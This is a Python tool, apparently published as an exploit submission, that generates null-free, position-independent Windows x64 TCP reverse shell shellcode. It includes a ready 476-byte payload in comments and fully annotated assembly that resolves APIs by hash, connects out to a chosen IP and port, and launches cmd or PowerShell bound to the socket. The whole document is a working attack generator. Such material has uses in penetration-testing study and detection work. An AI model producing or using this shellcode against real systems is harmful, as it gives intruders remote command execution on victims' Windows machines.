import ctypes, struct
import argparse
from keystone import *

# Exploit Title: Windows/x64 - PIC Null-Free TCP Reverse Shell Shellcode (476 Bytes)
# Exploit Author: Senzee
# Date: 08/29/2023
# Platform: Windows X64
# Tested on: Windows 11 Home/Windows Server 2022 Standard/Windows Server 2019 Datacenter
# OS Version (respectively): 10.0.22621 /10.0.20348 /10.0.17763
# Test IP: 192.168.1.45
# Test Port: 443
# Payload size: 476 bytes
# NUll-Free: True
# Detailed information can be found at https://github.com/senzee1984/micr0_shell



# Generated Shellcode (192.168.1.45:443):
# Payload size: 476 bytes
# buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
# buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
# buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
# buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
# buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
# buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
# buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x4c\x89\xcd\x41\xb8\x8e\x4e\x0e\xec\xe8\x8f\xff\xff"
# buf += b"\xff\x49\x89\xc4\x48\x31\xc0\x66\xb8\x6c\x6c\x50\x48\xb8\x57\x53\x32\x5f\x33\x32"
# buf += b"\x2e\x64\x50\x48\x89\xe1\x48\x83\xec\x20\x4c\x89\xe0\xff\xd0\x48\x83\xc4\x20\x49"
# buf += b"\x89\xc6\x49\x89\xc1\x41\xb8\xcb\xed\xfc\x3b\x4c\x89\xcb\xe8\x55\xff\xff\xff\x48"
# buf += b"\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\x48\x83\xec"
# buf += b"\x30\xff\xd0\x48\x83\xc4\x30\x49\x89\xd9\x41\xb8\xd9\x09\xf5\xad\xe8\x2b\xff\xff"
# buf += b"\xff\x48\x83\xec\x30\x48\x31\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0"
# buf += b"\x06\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd0\x49\x89\xc4\x48"
# buf += b"\x83\xc4\x30\x49\x89\xd9\x41\xb8\x0c\xba\x2d\xb3\xe8\xf3\xfe\xff\xff\x48\x83\xec"
# buf += b"\x20\x4c\x89\xe1\x48\x31\xd2\xb2\x02\x48\x89\x14\x24\x48\x31\xd2\x66\xba\x01\xbb"
# buf += b"\x48\x89\x54\x24\x02\xba\xc0\xa8\x01\x2d\x48\x89\x54\x24\x04\x48\x8d\x14\x24\x4d"
# buf += b"\x31\xc0\x41\xb0\x16\x4d\x31\xc9\x48\x83\xec\x38\x4c\x89\x4c\x24\x20\x4c\x89\x4c"
# buf += b"\x24\x28\x4c\x89\x4c\x24\x30\xff\xd0\x48\x83\xc4\x38\x49\x89\xe9\x41\xb8\x72\xfe"
# buf += b"\xb3\x16\xe8\x99\xfe\xff\xff\x48\xba\x9c\x92\x9b\xd1\x9a\x87\x9a\xff\x48\xf7\xd2"
# buf += b"\x52\x48\x89\xe2\x41\x54\x41\x54\x41\x54\x48\x31\xc9\x66\x51\x51\x51\xb1\xff\x66"
# buf += b"\xff\xc1\x66\x51\x48\x31\xc9\x66\x51\x66\x51\x51\x51\x51\x51\x51\x51\xb1\x68\x51"
# buf += b"\x48\x89\xe7\x48\x89\xe1\x48\x83\xe9\x20\x51\x57\x48\x31\xc9\x51\x51\x51\x48\xff"
# buf += b"\xc1\x51\xfe\xc9\x51\x51\x51\x51\x49\x89\xc8\x49\x89\xc9\xff\xd0"


def print_banner():
	banner="""
███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
"""
	print(banner)
	print("Author: Senzee")
	print("Original Github Repository: https://github.com/senzee1984/micr0_shell")
	print("Description: Dynamically generate PIC Null-Free Windows X64 TCP Reverse Shell Shellcode")
	print("This version does not support shellcode execution")
	print("Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255\n\n")


def get_port_argument(port):
	port_hex_str = format(port, '04x')
	port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
	if "00" in {port_part_1, port_part_2}:
		port += 257
		port_hex_str = format(port, '04x')
		port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
		return f"mov dx, 0x{port_part_1 + port_part_2};\nsub dx, 0x101;"
	return f"mov dx, 0x{port_part_1 + port_part_2};"


def get_ip_argument(ip):
	ip_hex_parts = [format(int(part), '02x') for part in ip.split('.')]
	reversed_hex = ''.join(ip_hex_parts[::-1])
	if "00" in ip_hex_parts and "ff" not in ip_hex_parts:
		hex_int = int(reversed_hex, 16)
		neg_hex = (0xFFFFFFFF + 1 - hex_int) & 0xFFFFFFFF
		return f"mov edx, 0x{neg_hex:08x};\nneg rdx;"
	return f"mov edx, 0x{reversed_hex};"


def get_shell_type_argument(shell_type):
	if shell_type == "cmd":
		return f"mov rdx, 0xff9a879ad19b929c;\nnot rdx;"
	return (f"sub rsp, 8;\nmov rdx, 0xffff9a879ad19393;\nnot rdx;\npush rdx;"
            f"\nmov rdx, 0x6568737265776f70;")


def output_shellcode(lan,encoding,var,save):
	sh = b""
	for e in encoding:
    		sh += struct.pack("B", e)
	shellcode = bytearray(sh)
	print("[+]Payload size: "+str(len(encoding))+" bytes\n")
	counter=0

	if lan=="python":
		print("[+]Shellcode format for Python\n")
		sc = ""
		sc = var+" = b\""
		for dec in encoding:
    			if counter % 20 == 0 and counter != 0:
        			sc += "\"\n"+var+"+="+"b\""
    			sc += "\\x{0:02x}".format(int(dec))
    			counter += 1

		if count % 20 > 0:
			sc += "\""
		print(sc)

	elif lan=="c":
		print("[+]Shellcode format for C\n")
		sc = "unsigned char " + var + "[]={\n"
		for dec in encoding:
    			if counter % 20 == 0 and counter != 0:
        			sc += "\n"
    			sc += "0x{0:02x}".format(int(dec))+","
    			counter += 1
		sc=sc[0:len(sc)-1]+"};"
		print(sc)


	elif lan=="powershell":
		print("[+]Shellcode format for Powershell\n")
		sc = "[Byte[]] $"+var+" = "
		for dec in encoding:
    			sc += "0x{0:02x}".format(int(dec))+","
		sc=sc[0:len(sc)-1]
		print(sc)

	elif lan=="csharp":
		print("[+]Shellcode format for C#\n")
		sc = "byte[] " + var + "= new byte["+str(len(encoding))+"] {\n"
		for dec in encoding:
    			if counter % 20 == 0 and counter != 0:
        			sc += "\n"
    			sc += "0x{0:02x}".format(int(dec))+","
    			counter += 1
		sc=sc[0:len(sc)-1]+"};"
		print(sc)

	else:
		print("Unsupported language! Exiting...")
		exit()


	if save=="true":
		try:
			with open(output, 'wb') as f:
				f.write(shellcode)
				print("\n\nGenerated shellcode successfully saved in file "+output)
		except Exception as e:
			print(e)


if __name__ == "__main__":
	print_banner()
	parser = argparse.ArgumentParser(description='Dynamically generate Windows x64 reverse shell.')
	parser.add_argument('--ip', '-i', required=True, dest='ip',help='The listening IP address, default value is 192.168.0.45')
	parser.add_argument('--port', '-p', required=False, default=443, dest='port',help='The local listening port, default value is 443')
	parser.add_argument('--language', '-l', required=False, default='python', dest='lan',help='The language of desired shellcode runner, default language is python. Support c, csharp, python, powershell')
	parser.add_argument('--variable', '-v', required=False, default='buf', dest='var',help='The variable name of shellcode array, default variable is buf')
	parser.add_argument('--type', '-t', required=False, default='cmd', dest='shell_type',help='The shell type, Powershell or Cmd, default shell is cmd')
	parser.add_argument('--save', '-s', required=False, default='False', dest='save',help='Whether to save the generated shellcode to a bin file, True/False')
	parser.add_argument('--output', '-o', required=False, default='', dest='output',help='If choose to save the shellcode to file, the desired location.')

	args = parser.parse_args()
	ip=args.ip
	port=int(args.port)
	lan=args.lan.lower()
	var=args.var
	shell_type=args.shell_type.lower()
	save=args.save.lower()
	output=args.output
	print("[+]Shellcode Settings:")
	print("******** IP Address: "+ip)
	print("******** Listening Port: "+str(port))
	print("******** Language of desired shellcode runner: "+lan)
	print("******** Shellcode array variable name: "+var)
	print("******** Shell: "+shell_type)
	print("******** Save Shellcode to file: "+save+"\n\n")

	args = parser.parse_args()
	port_argument = get_port_argument(port)
	ip_argument = get_ip_argument(ip)
	shell_type = get_shell_type_argument(shell_type)

	CODE = (
"find_kernel32:"
" xor rdx, rdx;"
" mov rax, gs:[rdx+0x60];"        # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
" mov rsi,[rax+0x18];"        # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
" mov rsi,[rsi + 0x30];"        # RSI is the address of the InInitializationOrderModuleList member in the _PEB_LDR_DATA structure
" mov r9, [rsi];"        # Current module is python.exe
" mov r9, [r9];"        # Current module is ntdll.dll
" mov r9, [r9+0x10];"        # Current module is kernel32.dll
" jmp jump_section;"

"parse_module:"        # Parsing DLL file in memory
" mov ecx, dword ptr [r9 + 0x3c];"        # R9 stores the base address of the module, get the NT header offset
" xor r15, r15;"
" mov r15b, 0x88;"	# Offset to Export Directory
" add r15, r9;"
" add r15, rcx;"
" mov r15d, dword ptr [r15];"        # Get the RVA of the export directory
" add r15, r9;"        # R14 stores  the VMA of the export directory
" mov ecx, dword ptr [r15 + 0x18];"        # ECX stores the number of function names as an index value
" mov r14d, dword ptr [r15 + 0x20];"        # Get the RVA of ENPT
" add r14, r9;"        # R14 stores  the VMA of ENPT

"search_function:"        # Search for a given function
" jrcxz not_found;"        # If RCX is 0, the given function is not found
" dec ecx;"        # Decrease index by 1
" xor rsi, rsi;"
" mov esi, [r14 + rcx*4];"        # RVA of function name string
" add rsi, r9;"        # RSI points to function name string

"function_hashing:"        # Hash function name function
" xor rax, rax;"
" xor rdx, rdx;"
" cld;"        # Clear DF flag

"iteration:"        # Iterate over each byte
" lodsb;"        # Copy the next byte of RSI to Al
" test al, al;"        # If reaching the end of the string
" jz compare_hash;"        # Compare hash
" ror edx, 0x0d;"        # Part of hash algorithm
" add edx, eax;"        # Part of hash algorithm
" jmp iteration;"        # Next byte

"compare_hash:"        # Compare hash
" cmp edx, r8d;"
" jnz search_function;"        # If not equal, search the previous function (index decreases)
" mov r10d, [r15 + 0x24];"        # Ordinal table RVA
" add r10, r9;"        # Ordinal table VMA
" movzx ecx, word ptr [r10 + 2*rcx];"        # Ordinal value -1
" mov r11d, [r15 + 0x1c];"        # RVA of EAT
" add r11, r9;"        # VMA of EAT
" mov eax, [r11 + 4*rcx];"        # RAX stores RVA of the function
" add rax, r9;"        # RAX stores  VMA of the function
" ret;"
"not_found:"
" ret;"

"jump_section:"        # Achieve PIC and elminiate 0x00 byte
" mov rbp, r9;"        # RBP stores base address of Kernel32.dll
" mov r8d, 0xec0e4e8e;"        # LoadLibraryA Hash
" call parse_module;"        # Search LoadLibraryA's address
" mov r12, rax;"        # R12 stores the address of LoadLibraryA function

"load_module:"
" xor rax, rax;"
" mov ax, 0x6c6c;"        # Save the string "ll" to RAX
" push rax;"        # Push the string to the stack
" mov rax, 0x642E32335F325357;"        # Save the string "WS2_32.D" to RAX
" push rax;"        # Push the string to the stack
" mov rcx, rsp;"        # RCX points to the "WS2_32.dll" string
" sub rsp, 0x20;"        # Function prologue
" mov rax, r12;"        # RAX stores address of LoadLibraryA function
" call rax;"        # LoadLibraryA("ws2_32.dll")
" add rsp, 0x20;"        # Function epilogue
" mov r14, rax;"        # R14 stores the base address of ws2_32.dll

"call_wsastartup:"
" mov r9, rax;"        # R9 stores the base address of ws2_32.dll
" mov r8d, 0x3bfcedcb;"        # Hash of WSAStartup
" mov rbx, r9;"        # Save the base address of ws2_32.dll to RBX for later use
" call parse_module;"        # Search for and get the address of WSAStartup
" xor rcx, rcx;"
" mov cx, 0x198;"
" sub rsp, rcx;"        # Reserve enough space for the lpWSDATA structure
" lea rdx, [rsp];"        # Assign the address of lpWSAData to the RDX register as the 2nd parameter
" mov cx, 0x202;"        # Assign 0x202 to wVersionRequired and store it in RCX as the 1st parameter
" sub rsp, 0x30;"        # Function prologue
" call rax;"        # Call WSAStartup
" add rsp, 0x30;"        # Function epilogue

"call_wsasocket:"
" mov r9, rbx;"
" mov r8d, 0xadf509d9;"        # Hash of WSASocketA function
" call parse_module;"        # Get the address of WSASocketA function
" sub rsp, 0x30;"        # Function prologue
" xor rcx, rcx;"
" mov cl, 2;"        # AF is 2 as the 1st parameter
" xor rdx, rdx;"
" mov dl, 1;"        # Type is 1 as the 2nd parameter
" xor r8, r8;"
" mov r8b, 6;"        # Protocol is 6 as the 3rd parameter
" xor r9, r9;"        # lpProtocolInfo is 0 as the 4th parameter
" mov [rsp+0x20], r9;"        # g is 0 as the 5th parameter, stored on the stack
" mov [rsp+0x28], r9;"        # dwFlags is 0 as the 6th parameter, stored on the stack
" call rax;"        # Call WSASocketA function
" mov r12, rax;"        # Save the returned socket type return value in R12 to prevent data loss in RAX
" add rsp, 0x30;"        # Function epilogue

"call_wsaconnect:"
" mov r9, rbx;"
" mov r8d, 0xb32dba0c;"        # Hash of WSAConnect
" call parse_module;"        # Get the address of WSAConnect
" sub rsp, 0x20;"        # Allocate enough space for the socketaddr structure
" mov rcx, r12;"        # Pass the socket descriptor returned by WSASocketA to RCX as the 1st parameter
" xor rdx, rdx;"
" mov dl, 2;"        # Set sin_family to AF_INET (=2)
" mov [rsp], rdx;"        # Store the socketaddr structure
" xor rdx, rdx;"
f"{port_argument}"	# Set local port dynamically
" mov [rsp+2], rdx;"        # Pass the port value to the corresponding position in the socketaddr structure
f"{ip_argument}"
" mov [rsp+4], rdx;"        # Pass IP to the corresponding position in the socketaddr structure
# " xor r8, r8;"
# " mov [rsp+8], r8;"        # Set zero for sin_zero. Comment these 2 lines to save more bytes, does not prevent the shellcode from working
" lea rdx, [rsp];"        # Pointer to the socketaddr structure as the 2nd parameter
" xor r8, r8;"
" mov r8b, 0x16;"        # Set namelen member to 0x16
" xor r9, r9;"        # lpCallerData is 0 as the 4th parameter
" sub rsp, 0x38;"        # Function prologue
" mov [rsp+0x20], r9;"        # lpCalleeData is 0 as the 5th parameter
" mov [rsp+0x28], r9;"        # lpSQOS is 0 as the 6th parameter
" mov [rsp+0x30], r9;"        # lpGQOS is 0 as the 7th parameter
" call rax;"        # Call WSAConnect
" add rsp, 0x38;"        # Function epilogue

"call_createprocess:"
" mov r9, rbp;"        # R9 stores the base address of Kernel32.dll
" mov r8d, 0x16b3fe72;"        # Hash of CreateProcessA
" call parse_module;"        # Get the address of CreateProcessA
f"{shell_type}"
" push rdx;"
" mov rdx, rsp;"        # Pointer to "cmd.exe" is stored in the RCX register
" push r12;"        # The member STDERROR is the return value of WSASocketA
" push r12;"        # The member STDOUTPUT is the return value of WSASocketA
" push r12;"        # The member STDINPUT is the return value of WSASocketA
" xor rcx, rcx;"
" push cx;"        # Pad with 0x00 before pushing the dwFlags member, only the total size matters
" push rcx;"
" push rcx;"
" mov cl, 0xff;"
" inc cx;"        # 0xff+1=0x100
" push cx;"        # dwFlags=0x100
" xor rcx, rcx;"
" push cx;"        # Pad with 0 before pushing the cb member, only the total size matters
" push cx;"
" push rcx;"
" push rcx;"
" push rcx;"
" push rcx;"
" push rcx;"
" push rcx;"
" mov cl, 0x68;"
" push rcx;"        # cb=0x68
" mov rdi, rsp;"        # Pointer to STARTINFOA structure
" mov rcx, rsp;"
" sub rcx, 0x20;"        # Reserve enough space for the ProcessInformation structure
" push rcx;"        # Address of the ProcessInformation structure as the 10th parameter
" push rdi;"        # Address of the STARTINFOA structure as the 9th parameter
" xor rcx, rcx;"
" push rcx;"        # Value of lpCurrentDirectory is 0 as the 8th parameter
" push rcx;"        # lpEnvironment=0 as the 7th argument
" push rcx;"        # dwCreationFlags=0 as the 6th argument
" inc rcx;"
" push rcx;"        # Value of bInheritHandles is 1 as the 5th parameter
" dec cl;"
" push rcx;"        # Reserve space for the function return area (4th parameter)
" push rcx;"        # Reserve space for the function return area (3rd parameter)
" push rcx;"        # Reserve space for the function return area (2nd parameter)
" push rcx;"        # Reserve space for the function return area (1st parameter)
" mov r8, rcx;"        # lpProcessAttributes value is 0 as the 3rd parameter
" mov r9, rcx;"        # lpThreatAttributes value is 0 as the 4th parameter
" call rax;"        # Call CreateProcessA
)

	ks = Ks(KS_ARCH_X86, KS_MODE_64)
	encoding, count = ks.asm(CODE)
	output_shellcode(lan,encoding,var,save)